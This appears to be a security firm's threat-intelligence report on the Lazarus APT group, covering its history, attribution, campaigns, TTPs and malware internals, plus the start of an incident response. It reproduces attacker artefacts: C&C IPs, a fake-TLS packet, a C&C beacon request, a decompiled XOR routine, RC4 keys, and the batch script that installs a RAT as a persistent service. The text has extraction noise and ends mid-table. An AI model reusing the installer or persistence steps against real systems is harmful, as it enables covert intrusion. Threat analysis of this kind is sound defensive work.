RISE OF LAZARUS\n\n\n###### INTRODUCING THE LAZARUS APT GROUP\n\nLazarus activities have been retroactively tracked back to 2007, under various names. For years, these\nactivities were seen as acts of cyberterrorism and vandalism, since most of them systematically involved\ndestruction of data and / or distributed denial of service attacks.\n\n\nThe Lazarus group was clearly identified and named in the 2016 Novetta report “Operation Blockbuster” [1].\nThis report uncovered and attributed a large set of malware based on the analysis of the Sony Pictures\nEntertainment targeted attack. Attribution and tracking was made possible due to the group’s habits of\nreusing huge chunks of code in most of their malware.\nThis report showcased how active and diverse the group is: using more than 45 different home-developed\nmalware families, Lazarus has been conducting destructive attacks but also advanced and persistent\nspying campaigns all over the world, making it worthy of the “APT” designation. TTP, arsenal and targets\nreveal that Lazarus is composed of at least three different subgroups: the Lazarus “core”, aiming at\ndisrupting activities and causing damage, Andariel, hacking for profit and intelligence, and Bluenoroff,\nmotivated by financial gains.\nUncovering its malware and activities didn’t stop the Lazarus group from continuing its operations or\nrenewing its arsenal, as the rest of this report will show.\n\nThe U.S. Government, mostly through its CERT, is referring to Lazarus as Hidden Cobra [2].\n\n\n###### ATTRIBUTION: LINKS WITH NORTH KOREA\n\nLazarus activities have often been wrongly attributed to China or to unknown cyberterrorist groups. After\nidentifying the Lazarus arsenal in 2016, researchers were able to track and attribute the group’s attacks,\nas well as monitoring their command & control servers. During an investigation, Group-IB discovered that\nLazarus operators connected to a C&C using two IP addresses from North Korea ( 210.52.109.22 and\n175.45.178.222 ). Moreover, analyses of compilation timestamps of the binaries used by the group in\ntheir attacks were consistent with North Korean working hours (see our analysis below). Other artefacts\ncan be mentioned as well, such as the YMD date format found in Lazarus log files, which is used almost\nexclusively in the Korean region\n\n\n-----\n\nDate formats by country. Yellow = YMD format\n\nIt is believed that Lazarus operators are linked to Bureau 121, a division of the Reconnaissance General\nBureau intelligence agency (Group-IB). This attribution to North Korea was confirmed by FBI and NSA\ninvestigations, based on internal sources and the technical elements previously mentioned [3].\n\n###### TARGETS & CAPABILITIES\n\nLazarus targets are very disparate, as the group has very diverse motives: intelligence, financial gains\nand disruption. Lazarus and its subgroups have been focusing on attacking governments, financial\ninstitutions, defense industry actors, IT and videogame companies. Geographically, most targets are\nlocated in South Korea and in South America.\n\nDespite operator mistakes and the fact that their attacks are most of the time technically simple, Lazarus\nand its subgroups are well-funded and able to discretely maintain persistence in networks for years. They\nwere seen adapting very fast, fighting against forensic investigators in real-time by repacking malware,\nerasing files or modifying encryption keys and algorithms in less than an hour after being discovered.\n\nFurthermore, they have been leveraging many 0day vulnerabilities they bought or developed on their\nown throughout the years.\n\nAll of these operations come at a cost. The Bluenoroff subgroup is supposedly in charge of financing the\nwhole ecosystem through big money heists.\n\n###### Lazarus\n\n\n-----\n\n###### CLARIFYING LINKS WITH OTHER ATTACKER GROUPS\n\nLazarus shares some TTP with other North Korean APT groups and has been using crimeware malware.\n\n\n###### — APT37 (Reaper)\n\nOther names:\n\n\nJ Reaper (FireEye)\n\nJ Ricochet Chollima (CrowdStrike) ScarCruft\n\n\nJ Red Eyes\n\nAPT37 is another North Korean attacker group focusing on the Middle East and South Korea. Reaper uses\nits own set of malware and infrastructure, and its activities don’t overlap with Lazarus’. The first known\nattack attributed to APT37 was traced back to 2014. They rely strongly on known or 0day exploits and\nspear phishing to infect their victims.\n\n\nThe group was publicly exposed by FireEye [4].\n\n\n###### — APT38 (Bluenoroff)\n\nAPT38 targets financial companies mostly in Asia. The first known operation took place in 2014 according\nto FireEye. The group was publicly exposed by FireEye [5]. This report doesn’t clearly draw a link between\nAPT38 and Lazarus subgroup Bluenoroff, which comes from the fact that FireEye classify APT groups\nfollowing its  own strict rules and criteria. To remove any confusion, we will be less rigorous than FireEye\nand consider APT38 to be Bluenoroff, based on malware code overlaps and TTPs. See the “Classification”\npart of this report for technical links with Lazarus.\n\n\nAPT38 TTP resemble those of Lazarus subgroups, especially how they carry out their attacks and chose\ntheir targets. They have been focusing on attacking banks connected to the SWIFT network. They\nwill most of the time infiltrate a bank network through vulnerable exposed servers, spend months\ngathering information, doing reconnaissance and moving laterally in the network until they find a way\nto steal money. Once the theft is complete, they will try to destroy all evidence by deploying crimeware\nransomware or wipers.\n\nAPT38 has its own toolset to maintain persistence, move laterally and manipulate SWIFT transactions.\nTheir targets are diverse and worldwide: Russia, Turkey, USA, Uruguay, Brazil, Vietnam, etc. This group\nhas shown some amateurism and carelessness despite being quite sophisticated, which is a common\ntrait amongst North Korean APT groups.\n\n\n###### — Clarifying links with TA505 (Emotet, TrickBot & Dridex)\n\nTA505 is a financially-motivated threat actor mostly operating from Russia. This actor is known for\nphishing campaigns using banking trojans such as Dridex and TrickBot, ransomware campaigns\ndeploying Locky and the wide use of the Emotet loader.\n\n\n###### — McAfee’s mistake\n\nSince early 2019, some reports mentioning links between Emotet/TrickBot and Lazarus were published.\nIt appears, however, that these reports were filled with misconceptions and faulty logic, which led to\nmisattributions.\n\n\nEmotet is one of the most common malware loaders in the wild. It has been used by the TrickBot gang to\ninstall their eponymous banking trojan. Both Emotet and TrickBot are believed to come from the Russian\ncybercrime.\n\nIn late 2018, Emotet and TrickBot were seen deploying a ransomware called Ryuk in well-funded\ncompanies’ infected networks. Contrary to most ransomware, Ryuk asks for a huge amount of money\n\n\n-----\n\nto decrypt files, sometimes more than $100,000 (see paid ransoms [6]). Analysis of this malware revealed\nthat it shared most of its code with another crimeware ransomware named Hermes. Hermes was sold on\nunderground hacker forums for as little as $300 in 2017/2018 and was quite popular during those years.\nLazarus has been buying and using Hermes to cover their tracks by encrypting disks after a completed\noperation multiple times. Given these facts, some hasty researchers spread the idea that Ryuk and\nLazarus were tied due to Hermes. This was also supported by the fact that researchers reported that they\nsaw previous Lazarus infections cohabit with Emotet and TrickBot, which can also be observed during a\nforensic mission.\n\nMcAfee, in charge of investigating a Ryuk outbreak at that time, published a blogpost to clarify the\nsituation and reveal some findings supporting that Ryuk was in fact coming from a Russian-speaking\ncountry and probably linked to the TrickBot gang.\n\n###### — Latest proof of actual links\n\nIn mid-2019, what were initially seen as coincidences became more and more suspicious and some strong\nlinks were found during incident response missions, with Lazarus samples being dropped shortly after\nTA505 malware infected the network. TA505 and Lazarus IOCs were found altogether in bank networks\nand PowerShell post-intrusion scripts attributed to TA505 and Lazarus appeared to be very similar [7 8].\nFrom there, it is hard not to consider the fact that the TA505 attackers seem to be selling accesses to\nbank networks to Lazarus. LEXFO also found TA505 malware (TrickBot and Emotet) during its incident\nresponse involving Lazarus, which corroborates these assertions.\n\n###### MAIN OPERATIONS (2007 - 2015)\n\nLazarus operations have been traced back to 2007. The first attack attributed to Lazarus was a DDoS\nagainst South Korean and U.S. websites leveraging the MyDoom botnet. The group has been very active\never since, conducting the operations below (Intezer [9]):\n\n\n**Year** **Lazarus campaign** **Year** **Lazarus campaign**\n\n2007 Silent Chollima 2015 Tdrop\n\n2009 MYDOOM 2016 Bangladesh Bank Heist\n\n2011 10 Days of Rain 2017 WannaCry\n\n2011 Operation Troy 2017 Hidden Cobra\n\n2011 SierraBravo 2017 Polish Attacks\n\n2011 Blockbuster 2017 Ratankba\n\n2011 Joanap 2017 RokRAT\n\n2011 KorDLLBot 2018 South Korean Power Grid\n\n2011 Brambul 2018 GoldDragon\n\n2013 KorHigh 2018 NavRAT\n\n2013 DarkSeoul 2018 Lazarus Bitcoin\n\n2013 KimSuky 2018 NK Gambling\n\n2014 Destover 2018 RedGambler\n\n2015 Duuzer 2018 LEXFO’s incident response\n\n\n-----\n\n### II. LAZARUS’   NEW MOTIVES \n###### (2016 - 2019)\n\n FIGHTING SANCTIONS IN THE CYBER SPACE\n\n\nNorth Korea has been targeted by multiple rounds of financial sanctions and restrictions. In 2017, the\nUN and the United States issued many resolutions and orders that had heavy negative impact on North\nKorea exchanges [10].\n\nTo compensate, we have seen the Lazarus group focus on hacking financial institutions all around the\nworld to steal money. Even though disruptive attacks keep being conducted, it is clear that Lazarus prefer\nheists involving big sums of money. Likewise, spying operations are still being conducted by North Korea\nbut are usually attributed to the fast-expanding APT37 [11].\n\n\nThe Andariel subgroup illustrates how Lazarus changed its focus from information gathering to financial\ngains. Precisely, Andariel was actively targeting the defense industry until the end of 2016, when they\nswitched to attacking financial institutions, as showed by the timeline of the main Andariel attacks\nbelow: (AhnLab [12])\n\n\n-----\n\n**Date** **Target** **Purpose**\n\nNovember 2015 Defense Intelligence\n\nFebruary 2016 Security company Intelligence\n\nApril 2016 Defense Intelligence\n\nJune 2016 Defense Intelligence\n\nAugust 2016 Military Intelligence\n\nOctober 2016 Gambling Financial gains\n\nJanuary 2017 Gambling Financial gains\n\nMarch 2017 ATM Financial gains\n\nApril 2017 Energy Intelligence\n\nMay 2017 Financial industry Financial gains\n\nJune 2017 Financial industry Financial gains\n\nOctober 2017 Travel agency Financial gains\n\nDecember 2017 Travel agency Financial gains\n\nDecember 2017 Telecommunications Spying\n\nDecember 2017 Cryptocurrency exchange Financial gains\n\nFebruary 2018 Cryptocurrency exchange Financial gains\n\nFebruary 2018 Politics Spying\n\nOctober 2018 ATM (FastCash) Financial gains\n\n\n###### BANKS & ATM\n\nMost bank attacks are carried out by the Bluenoroff subgroup, while ATM attacks are usually attributed\nto Andariel. In both cases, two methods were leveraged:\n\nJ Spear phishing Watering hole\n\nJ Vulnerabilities in specific and targeted software directly to perform supply chain attacks\n\nOne of largest attacks occurred in early 2017, when it was discovered that more than tweny Polish banks\nwere infiltrated by Lazarus. The financial loss is unknown but the scale of the attack and its success is a\ntestament to how capable the attackers are. Bank employees were targeted by several watering holes [13]\n\ndelivering a payload through a known Silverlight exploit (CVE-2016-0034).\n\nLazarus also unsurprisingly targets ATM to steal credit card information. Lazarus targeted the ATM\noperator VANXATM in February 2015. The attack was sophisticated and leveraged a 0day in the antivirus\nsoftware as well as a bad configuration of the update server allowing the attackers to install their malware\non more than 60 connected ATM. It was reported that 230,000 unique credit card information numbers\nwere exfiltrated to Lazarus C&C. The attack was attributed to the Andariel subgroup [14].\n\nAnother example of a successful ATM attack by Lazarus was uncovered by US-CERT [15] and Symantec [16]\n\nand was named “FASTCash campaign”. This attack successfully targeted banks in Asia and Africa, and\nforced issuing banks to accept fraudulent withdrawal requests. Different tailor-made malware were used\nin each attack. Such an attack involving ATM jackpotting requires physical presence and a mule network,\nshowing how experienced Lazarus attackers are in carrying out advanced cybercriminal operations. Tens\nof millions of dollar were successfully stolen from banks.\n\nLazarus has also been targeting Point-of-Sale businesses with the Ratankba malware family they\ndeveloped, showing that they don’t miss any opportunity to make quick money using custom tools [17].\n\n\n-----\n\n###### TARGETING CRYPTOCURRENCY BUSINESSES\n\nLazarus attackers have recently been focusing on hacking cryptocurrency businesses, with a particular\nemphasis on South Korean exchanges. These attacks are very profitable and most of the time quite\nunsophisticated, making them the perfect way for stealing money **[18]. The most significant attack was**\nagainst Coincheck and ended up with Lazarus stealing about $534 million [19].\n\n\nIn 2018, Kaspersky uncovered a Lazarus attack they called “Operation AppleJeus”. The attack was\nsophisticated and targeted cryptocurrency users and exchanges. Victims were infected by a backdoored\nMacOS cryptocurrency trading software. Most samples used were compiled in 2017 [20].\n\nIn the end of 2017, ProofPoint uncovered a new implant named PowerRatbanka. This malware was\ndeveloped using PowerShell, which shows that Lazarus attackers are following the trends and their\narsenal is in constant development [21].\n\n\nOther Lazarus attacks were reported by Group-IB in 2018 against YouBit, Coinis and Yapizon with millions\nof dollars stolen in each case. All of the exchanges are located in South Korea, and spear phishing was\nthe main intrusion vector.\n\n\n###### NEW TOOLSET\n\nBeing exhaustive in the description of the Lazarus toolset would be a trite task, as the group is able to\nquickly develop custom malware for each target. They have also been seen using malware from other\ncriminal groups, particularly ransomware, to make attribution harder and cover their tracks.\n\n\nFor instance, some Lazarus malware were found alongside Emotet and Trickbot, and the attackers will\nexecute ransomware such as Hermes to hide their activities and fingerprints after a successful operation.\n\nRecently, a new specific malware toolset was used by Lazarus in different attacks. LEXFO investigated\nsuch an attack involving malware from this set and will describe its findings in the next part.\n\n\nLEXFO also noticed that the attackers were no longer using the VisualStudio C++ v6 compiler, and the\nmost recent samples found were compiled using VisualStudio C++ v8.\n\n\n###### — MacOS malware\n\nKaspersky uncovered an attack attributed to Lazarus leveraging a trojanized cryptocurrency trading\napplication for MacOS. This discovery showed that the North Korean group is not slowing down and\nkeeps improving its technical capabilities [22].\nThe malware could be attributed to Lazarus mostly because of a hardcoded RC4 key found in other\nLazarus malware and a reused C&C domain.\n\n\nIn the fall of 2019, TrendMicro also published a blog article where they uncovered a MacOS variant of the\nNukesped trojan found in the wild, attributed to Lazarus [23].\n\n\n###### — Mobile malware\n\nLazarus expanded their capabilities and developed their first mobile malware in 2017, by adding\nmalicious code to a legitimate APK. This malware was discovered and analyzed by McAfee in a blogpost\n**24. The trojanized Android application was not spread through Google Play.**\nAttribution to Lazarus is based on the communication protocol which was made to hide packets in the\nlegitimate flow of TLS/SSL traffic, and some hardcoded values found in other Lazarus samples.\n\n\n-----\n\n-----\n\n### III. TECHNICAL   ANALYSIS OF KEY   LAZARUS ATTACKS\n\n###### LAZARUS TTP\n\n\n###### — Attack scheme\n\nConsidering the vast amount of attacks carried out by Lazarus throughout the years, it is possible to\nnotice some recurring patterns in the way the group operates. These patterns have not changed much\nsince their first attacks.\n\n\nJ Intrusion through spear phishing, watering hole, bruteforce or web vulnerabilities Network\n**discovery using custom or publicly-available tools**\nJ Gathering credentials through Mimikatz-like tools and keyloggers Lateral movements using\n**custom or publicly-available tools Fulfilling the attack goal: stealing money and/or information**\nJ Covering tracks by wiping systems or infecting the victims with crimeware malware or\n**ransomware**\n\nLazarus attack pattern\n\n\n-----\n\n###### — Intrusion\n\nLazarus operators use a wide range of tricks to try and infect their victims. Their main vector is spear\nphishing, sometimes using 0day or known vulnerabilities. They also perform watering hole attacks and\nRDP password bruteforce [25].\n\nFurthermore, they often exploit bad network isolation by hacking into webservers in order to try and\naccess the internal network of a targeted organization. In this way,they were able to reach the server\nconnected to the SWIFT network in the case of the Bangladesh Central Bank attack.\n\nIn an attempt at attacking a Chilean bank, the Lazarus operators targeted an employee with a fake job\noffer. They set up an interview via a Skype call where the targeted employee was tricked into downloading\nand executing a payload. This shows that the attackers are becoming more and more aggressive [26].\n\n###### — Attempts to confuse attribution\n\nLazarus malware developers have been trying to fool researchers by introducing some “false flag” Russian\nstrings as command names. The attempt was not convincing as it was obvious for native speakers that\nnames were lazily translated to Russian. The Russian command names are still used to this day and can\nbe used as a signature [27 28].\nHere are some of them that LEXFO found in a very recent sample:\n\nPoluchit\n\nNachalo\n\nssylka\n\nustanavlivat\n\nkliyent2podklyuchit\n\nThese strings were used in combination with commercial Russian packers to try and fool researchers and\njournalists, at a time where they are often too quick to attribute attacks to Russian groups.\n\n###### — Malware design\n\nLazarus malware usually have the following patterns:\n\nJ Multistaged\n\nJ Command-line malware and tools\n\nJ Designed to be run as Svchost services (for persistence) API are loaded dynamically\n\nLazarus developers usually forget to strip the PDB path from compiled binaries, even when they disclose\nvaluable information such as what the malware does, its goal, or even the developer’s name.\n\n###### — Communications\n\nLazarus malware often use a communication protocol that has been named “Fake TLS” **[29 30]** for\ncommunications. This protocol makes malicious packets look like legitimate TLS handshakes and\ncommunications might stay under the radar due to heavy TLS traffic on port 443.\n\nThis protocol can be found in most Lazarus malware. It is however hard to detect with Snort and Suricata\nrules considering the huge stream of TLS/SSL packets to monitor, which explains why it has been\nconsistently used for years by the attackers.\n\nExample of a Lazarus Fake-TLS packet:\n\n\n0000 17 03 01 00 30 5d 15 3d a2 40 ef d2 01 25 ca 54 ....0].=.@...%.T\n\n0010 26 5f 5d b0 d2 2f 2f 6d 2d ec 56 85 b0 4c a9 bf &_]..//m-.V..L..\n\n0020 eb 97 be 31 ad cd de 3a b4 71 1e c8 53 96 0b 2d ...1...:.q..S..\n\n0030 c3 91 3d a2 15 =\n\n\n-----\n\nA legitimate TLS packet would be structured this way:\n\n\n**Bytes** **Meaning**\n\n17 ApplicationData protocol type\n\n\n03 01 SSL version (TLS 1.0)\n\n00 30 Message length (48 bytes)\n\n\n5d ... 15 Encrypted application data\n\n\nIn case of a Lazarus fake-TLS packet, the structure is:\n\n\n**Bytes** **Meaning**\n\n17 03 01 Fake TLS header\n\n\n00 10 Size of next packet < 0x4000\n\n\nThe first packet is a fake-TLS handshake sent to the C&C server:\n\n0000 17 03 01 00 04 .....\n\n\nData are then encrypted using algorithms and/or keys different for each malware, usually relying on XOR\noperations or standard algorithms such as RC4.\n\nDifferent and more standard communication protocols have been used by Lazarus. Simple HTTP\nrequests with hardcoded URLs were implemented in some cases where attackers didn’t care too much\nabout detection.\n\n\nHere is an example of a Lazarus HTTP request:\n\nGET /sub/lib/lib.asp?id=dn678 HTTP/1.1 Accept: */*\n\n\nAccept-Encoding: gzip, deflate\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0;\nSLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center\nPC 6.0)\n\n\n[Host: www.secuvision.co.kr Connection: Keep-Alive](http://www.secuvision.co.kr/)\n\n###### — Filenames\n\n\nFor payloads and modules, filenames are generally inspired by legitimate Windows services and end with\n“xxxsvc(.dll|.exe)”:\n\nswpsvc.dll\n\nsppsvc.dll\n\nsqcsvc.dll\n\n\ngpsvc.exe\n\nuploadmgrsvc.dll\n\n\nwmisecsvc.dll\n\n\n...\n\nLazarus has been using [filename].tmp and [filename].dat filenames for configurations or to store\ndata to be sent to the C&C. Recently, they started using configuration files named [filename].dll.mui .\n\n\n###### — Persistence\n\nPersistence is usually achieved by setting the main payload as an AUTO_START svchost service, which\nmeans the malware will be loaded each time the user session starts through the command svchost -k\n\n[ i ]\n\n\n-----\n\n###### — Packers\n\nAs Lazarus reuse a lot of code in their malware, they manage to evade detection by signature using free\nand commercial packers. Here is a list of the main packers encountered:\n\nJ UPX\n\nJ VMProtect\n\nJ Themida\n\nJ Armadillo\n\nJ ASPack\n\nJ Enigma\n\nJ Protector\n\n###### — Third-party libraries\n\nLazarus uses statically linked third party libraries in their malware for communications and TLS/SSL\nimplementation. The following libraries were seen:\n\nJ Libcurl (version 7.49.1)\n\nJ mbedTLS / PolarSSL\n\nJ wolfSSL\n\nThe Libcurl library with the same exact version is still being used in the most recent Lazarus samples. To\ncompress data, Lazarus developers usually use inflate/deflate lib versions 1.1.3 and 1.1.4 as well as Zlib\nversion 1.0.1 and 1.2.7.\n\n###### — Third-party tools\n\nLazarus has its own toolbox, but operators will also use third-party legitimate tools when necessary. They\nmostly include credential-gathering tools and software allowing lateral movements. Attackers will pack\ntools that are widely flagged by anti-virus, such as Mimikatz, to evade signature-based detection.\n\nThe list of third-party tools includes:\n\nJ PsExec\n\nJ Mimikatz\n\nJ FreeRDP\n\nJ SC.exe\n\nJ Net.exe\n\nJ ...\n\n###### — Encryption\n\nThe Lazarus group uses standard and custom encryption algorithms. Custom algorithms are usually\nbased on several XOR operations with constant values, while standard ones are common such as RC4,\nAES and DES.\n\nThey will sometimes use exotic ciphers like Spritz, an RC4-like algorithm they implemented in a set of\nmalware described by Kaspersky. They have the bad habit of reusing encryption algorithms and keys in\ndifferent malware, which helps detection and attribution.\n\nLazarus uses encryption for communications, hiding dynamically-imported API names to avoid heuristics\nand to encrypt their payloads. For the latter, they also use less sophisticated ways of hiding strings, such\nas Base64 encoding and alphabet substitution.\n\nWe will review some encryption algorithms found in samples below.\n\n\n-----\n\n###### — XOR-based algorithms\n\nMost custom algorithms implemented by Lazarus are based on XOR operations with hardcoded keys.\nWhile most of them are pretty straightforward to understand, some are quite imaginative. Here are some\nalgorithms and keys found in multiple Lazarus samples:\n\n\n**Algorithm** **Key** **Campaign / Malware**\n\nXOR 0xA7 [Blockbuster](https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)\n\n\nXOR 0x9E [Lazarus downloader](https://medium.com/emptyregisters/lazarus-downloader-brief-analy-17875f342d96)\n\nXOR 0x23 [FASTCash](https://www.us-cert.gov/ncas/analysis-reports/AR18-275A)\n\n\nXOR QzEc, wPof Attack on Taiwanese banks + LEXFO incident response\n\nXOR-based 0xF4F29E1B [Lazarus under the hood](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180231/LazarusUnderTheHood_PDF_final_for_securelist.pdf)\n\nXOR-based 0xCBF9A345 [Lazarus under the hood](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180231/LazarusUnderTheHood_PDF_final_for_securelist.pdf)\n\nXOR-based 0x4F833D5B [Lazarus under the hood](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180231/LazarusUnderTheHood_PDF_final_for_securelist.pdf)\n\n\nXOR-S^ / [Phandoor (Troy)](https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2013/dissecting-operation-troy.pdf)\n\nXOR-1FE / Phandoor\n\n\nXOR-7F8 / asdfdoor, FBIRat, Passive backdoor\n\n\nXOR-FFFFFFF0 / Rifle\n\n\nBelow is an example of a custom XOR-based encryption algorithm using hardcoded keys and constants\nfound in several Andariel samples.\n\nlpBuffer = buff;\n\n\nLOBYTE(key4) = 0x82u;\n\nv13 = buff;\n\n\nkey3 = 5;\n\nkey1 = 0x556F9482;\n\n\nkey2 = 0xAFC12058;\n\nif ( (signed int)dwSize > 0 ) {\n\n\noffset = encryptedBuffer - (char *)lpBuffer; i = dwSize;\n\ndo {\n\n\n*lpBuffer = key3 ^ key2 ^ key4 ^ lpBuffer[offset]; key3\n\n= key3 & key2 ^ key4 & (key3 ^ key2);\n\n\nkey4 = ((((unsigned int16)key1 ^ (unsigned int16)(8 * key1)) & 0x7F8) << 20) | (key1 >> 8); key2\n\n= (((key2 << 7) ^ (key2 ^ 16 * (key2 ^ 2 * key2)) & 0xFFFFFF80) << 17) | (key2 >> 8);\n\n\n++lpBuffer; nbBytesLeft\n\n= i-- == 1;\n\n\nkey1 = ((((unsigned int16)key1 ^ (unsigned int16)(8 * key1)) & 0x7F8) << 20) | (key1 >> 8);\n\n\n}\n\nwhile ( !nbBytesLeft );\n\n\nlpBuffer = v13;\n\nsize = dwSize;\n\n\n}\n\n\nA good example of code reuse is the “S^” algorithm (S-hat) recently seen in many Andariel malware\ncompiled  in 2016/2017. We found traces of the same algorithm in samples used in Operation Troy,\ncompiled in 2010 and 2011 in a payload named bs.dll [31].\n\n\n###### — RC4\n\nThe RC4 algorithm is found in a number of malware, as it is easy and quick to implement. Lazarus\ndevelopers will sometimes modify it lightly and double the PRGA part of the algorithm to confuse analysts.\n\n\nBelow are some of the hardcoded keys found in samples [32].\n\n\n-----\n\n**Hardcoded key**\n\n4E 38 1F A7 7F 08 CC AA 0D 56 EF F9 ED 08 EF\n\nE2 A4 85 92\n\nf9 65 8b c9 ec 12 f9 ae 50 e6 26 d7 70 77 ac 1e\n\n53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15\n\n\n###### — AES\n\nThe AES algorithm was found in many Lazarus samples: Electricfish, backdoors involved in India attacks,\nJoanap, various Bluenoroff samples...\n\n###### — Spritz\n\nThe Spirtz encryption algorithm is not as common as the others but was used by Lazarus by one of their\nloaders to decrypt payloads.

These proxies will relay\npackets from the operators to the implants or the other way around through fake TLS packets.\n\nAccording to a Group-IB investigation [33], operators set up a three-layer architecture using non standard\nports.\n\nDomains and servers are usually leased in Asian countries and paid with bitcoins or other cryptocurrencies\nfor anonymity. Lazarus used to leverage hacked servers for their C&C infrastructure but recent attacks\nshow that they have moved away from it.\n\nFrom a geographic point of view, most C&C appear to be hosted in the US and in Asian countries. The\ndiagram below shows locations of more than 50 C&C that have been used by Lazarus in different attacks\nthe past two years.\n\n\n-----\n\n###### MITRE ATT&CK MATRIX\n\n — Techniques used\n\n\nThe ATT&CK matrix [34] related to Lazarus clearly shows how active and diverse the group is.\n\n\n**Initial** **Privilege** **Defense** **Credential**\n**Execution** **Persistence**\n**Access** **Escalation** **Evasion** **Access**\n\nDrive-by Command-Line Account Access Token Access Token Account\nCompromise Interface Manipulation Manipulation Manipulation Manipulation\n\n\nSpearphishing Compiled HTML\nCompiled HTML File Bootkit New Service Brute Force\nAttachment File\n\nExploitation for Hidden Files and Process Credential\nConnection Proxy\nClient Execution Directories Injection Dumping\n\n\nDisabling Input\nScripting New Service\nSecurity Tools Capture\n\nRegistry Run Keys\nUser Execution File Deletion\n/ Startup Folder\n\n\nWindows\nManagement\nInstrumentation\n\n\nShortcut Hidden Files and\nModification Directories\n\nObfuscated Files\nor Information\n\nProcess Injection\n\n\nScripting\n\nTimestomp\n\n\n**Lateral** **Command**\n**Discovery** **Collection** **Exfiltration** **Impact**\n**Movement** **And Control**\n\n\nApplication\nWindow Discovery\n\n\nRemote\nDesktop\nProtocol\n\n\nData from Local Data\nCommonly Used Port Data Compressed\nSystem Destruction\n\n\nDisk\nFile and Directory Remote File\nData Staged Connection Proxy Data Encrypted Content\nDiscovery Copy\nWipe\n\n\nCustom\nWindows\nInput Capture Cryptographic\nProcess Discovery Admin Shares\nProtocol\n\nQuery Registry Data Encoding\n\n\nExfiltration Over\nAlternative Protocol\n\nExfiltration Over\nCommand and Control\nChannel\n\n\nDisk\nStructure\nWipe\n\nResource\nHijacking\n\n\nSystem Information\nFallback Channels Service Stop\nDiscovery\n\n\nSystem Network\nConfiguration\nDiscovery\n\n\nMultiband\nCommunication\n\n\nSystem\nShutdown/\nReboot\n\n\nSystem Owner/\nRemote File Copy\nUser Discovery\n\nSystem Time Standard Application\nDiscovery Layer Protocol\n\n\nStandard\nCryptographic\n\n\n-----\n\n###### — Software\n\nSimilary, they have been using the set of software below (list is not exhaustive) [35]:\n\n\n**ID** **Name**\n\nS0347 AuditCred\n\nS0245 BADCALL\n\nS0239 Bankshot\n\nS0181 FALLCHILL\n\nS0246 HARDRAIN\n\nS0376 HOPLIGHT\n\nS0271 KEYMARBLE\n\nS0002 Mimikatz\n\nS0108 netsh\n\nS0238 Proxysvc\n\nS0241 RATANKBA\n\nS0364 RawDisk\n\nS0263 TYPEFRAME\n\nS0180 Volgmer\n\n\nS0366 WannaCry\n\n\n-----\n\n### IV. INCIDENT   RESPONSE: \n#### HOW TO UNCOVER AN  ONGOING LAZARUS ATTACK\n\n###### CONTEXT\n\n\nIn late December 2018, LEXFO was contacted by a mobile video game company following multiple\ninfections. The company was alerted of outgoing malicious traffic to a known Lazarus C&C that was being\nmonitored.\n\nAbout 5 machines were identified as infected in the network at the time. LEXFO immediately asked\nfor RAM and disk dumps of the infected systems, as well as all captured encrypted traffic and began\ninvestigating.\n\n\n###### FIRST ASSESSMENT\n\nLEXFO was provided with several RAM and disk dumps of the infected machines and three binaries as\nwell as a configuration file and a batch installer, found on the computers and believed to have been used\nby the attackers.\n\n\n**Filename** **Type** **Size**\n\nigfx.exe PE32+ executable (GUI) x86-64 260K\n\nsqcsvc.dll PE32+ executable (DLL) (GUI) x86-64 2,6M\n\n\nsqcsvc.dll.mui Data 236\n\nsvc.bat Batch script 643\n\n\n-----\n\nA quick look at the batch script revealed that its purpose was to deploy and install the RAT payload\nsqcsvc.dll and its encrypted configuration. The script also takes care of installing a persistent service\nnamed sqcsvc .\n\nsvc.bat installer script content:\n\nmkdir “c:\\programdata\\microsoft\\sqcsvc”\n\nmove “c:\\perflogs\\1.dat” “c:\\programdata\\microsoft\\sqcsvc\\sqcsvc6.ldx”\n\nmove “c:\\perflogs\\1.dll” “c:\\windows\\system32\\sqcsvc.dll”\n\nmove “c:\\perflogs\\1.dll.mui” “c:\\windows\\system32\\sqcsvc.dll.mui”\n\nsc create sqcsvc binPath= “%SystemRoot%\\System32\\svchost.exe -k sqcsvc” start= auto reg\nadd “HKLM\\SYSTEM\\ControlSet001\\Services\\sqcsvc\\Parameters”\n\nreg add “HKLM\\SYSTEM\\ControlSet001\\Services\\sqcsvc\\Parameters” /v ServiceDll /t REG_EXPAND_SZ /d “%SystemRoot%\\System32\\sqcsvc.dll”\n\nreg add “HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost” /v sqcsvc /t REG_\nMULTI_SZ /d sqcsvc\n\nThen, LEXFO started reverse-engineering the sqcsvc payload that was found in the RAM and disk dumps\nin order to assess the attackers’ capabilities and find the decryption algorithm for communications.\n\n###### ATTRIBUTING THE ATTACK\n\nOur classifier tool didn’t show any strong link with other Lazarus samples, as the payloads\nwe found were part  of the new arsenal of Lazarus at the time. The only link found\nis a Yara rule match between IGFX and a sample involved in a Lazarus heist in Taiwan\n( 9a776b895e93926e2a758c09e341accb9333edc1243d216a5e53f47c6043c852 ). The rule matched\nstrings from the static library libcurl with the specific version 7.49.1 . We had to investigate further to\nconfirm.\n\nFilenames match Lazarus’ habits, as we have the payload named “*svc.dll”, its encrypted configuration\nfile as a MUI-disguised file and a batch script to install the malware. The payload is also made persistent\nby registering  it as a service, which is how Lazarus usually operate.\n\nLooking closely at the SQCSVC payload metadata, we can see that its original name was sock_64.dll,\nthe compilation timestamp is Sat, 03 Nov 2018 00:47:21 UTC which is consistent with North Korea\nworking hours (UTC+9) and that it was packed using Themida Code-Virtualizer.\nAt that point, Lazarus can already be considered the #1 suspect.\n\n\n**Filename** **Compilation timestamp**\n\nsqcsvc.dll Sat, 03 Nov 2018 00:47:21 UTC\n\nigfx.exe Mon, 02 May 2016 03:24:39 UTC\n\nhs.exe Mon, 01 Oct 2018 10:30:58 UTC\n\niehelp.exe Mon, 24 Sep 2018 11:12:22 UTC\n\niehelp2.exe Wed, 14 Nov 2018 14:02:19 UTC\n\nswpsvc.dll Sat, 11 Aug 2018 14:14:54 